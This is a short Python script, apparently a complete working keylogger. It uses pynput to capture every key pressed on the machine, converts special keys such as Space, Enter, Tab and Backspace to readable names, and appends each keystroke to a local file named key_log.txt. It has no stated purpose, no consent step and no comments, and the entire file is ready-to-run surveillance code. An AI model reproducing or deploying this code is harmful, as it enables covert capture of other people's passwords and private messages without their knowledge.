from pynput.keyboard import Listener

log_file = "key_log.txt"

def log_keystroke(key):
    key = str(key).replace("'", "")  

    if key == 'Key.space':
        key = 'Space'
    elif key == 'Key.enter':
        key = 'Enter'
    elif key == 'Key.tab':
        key = 'Tab'
    elif key == 'Key.backspace':
        key = 'Backspace'
    elif key.startswith('Key.'):
        key = key.replace('Key.', '') 
        
    with open(log_file, 'a') as log:
        log.write(f"{key}\n") 


with Listener(on_press=log_keystroke) as listener:
    listener.join()
